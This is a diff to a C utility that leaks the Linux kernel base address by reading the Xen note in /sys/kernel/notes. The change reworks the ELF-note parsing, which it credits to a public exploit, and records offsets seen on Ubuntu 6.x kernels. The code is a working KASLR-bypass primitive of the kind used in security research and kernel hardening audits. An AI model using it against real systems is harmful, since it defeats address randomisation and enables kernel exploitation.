@@ -42,34 +42,56 @@ unsigned long get_kernel_addr_kernel_notes_xen_entry() {
   printf("[.] checking /sys/kernel/notes ...\n");
 
   fd = open("/sys/kernel/notes", O_RDONLY);
+
   if (fd < 0) {
     perror("[-] open(/sys/kernel/notes)");
     close(fd);
     return 0;
   }
 
-  // kernel ELF notes parsing taken from Nassim Asrir's exploit:
+  // modified kernel ELF notes parsing from Nassim Asrir's exploit:
   // https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
   while (1) {
     if (read(fd, &namesz, sizeof namesz) != sizeof namesz)
       break;
-    if (read(fd, &descsz, sizeof descsz) != sizeof descsz)
-      break;
-    if (read(fd, &type, sizeof type) != sizeof type)
-      break;
+
+    // printf("namesz: %u\n", namesz);
+
+    if (namesz == 0)
+      continue;
 
     if (namesz > sizeof name)
       break;
+
+    if (read(fd, &descsz, sizeof descsz) != sizeof descsz)
+      break;
+
+    // printf("descsz: %u\n", descsz);
+
+    if (descsz == 0)
+      continue;
+
     if (descsz > sizeof desc)
       break;
 
+    if (read(fd, &type, sizeof type) != sizeof type)
+      break;
+
+    // printf("type: %u\n", type);
+
     if (read(fd, &name, namesz) != namesz)
       break;
+
+    // printf("name: %s\n", name);
+
     if (read(fd, &desc, descsz) != descsz)
       break;
 
-    if (!strcmp(name, "Xen") && type == 2 && descsz == 8) {
+    // printf("desc: %s\n", desc);
+
+    if (strcmp(name, "Xen") == 0 && type == 2 && descsz == 8) {
       addr = *(unsigned long *)&desc;
+      // printf("addr: %lx\n", addr);
       break;
     }
 
@@ -82,14 +104,14 @@ unsigned long get_kernel_addr_kernel_notes_xen_entry() {
   close(fd);
 
   if (!addr) {
-    printf("[-] Could not find Xen symbol address in ELF notes\n");
+    printf("[-] Could not find Xen address in ELF notes\n");
     return 0;
   }
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
     return addr;
 
-  printf("[-] Invalid Xen symbol address in ELF notes: %lx\n", addr);
+  printf("[-] Invalid Xen address in ELF notes: %lx\n", addr);
 
   return 0;
 }
@@ -103,9 +125,9 @@ int main() {
   printf("leaked Xen hypercall_page address: %lx\n", addr);
   printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
 
-  // NOTE:
-  // - Calculated base address was off by 0x100_0000 on one test system
-  //   (Ubuntu 22.04 kernel 6.2.0-39-generic)
+  // NOTE: Calculated base address is off by +0x100_0000 on 6.x kernels.
+  // * Ubuntu 22.04 kernel 6.2.0-39-generic
+  // * Ubuntu 22.04 kernel 6.5.0-15-generic
 
   return 0;
 }
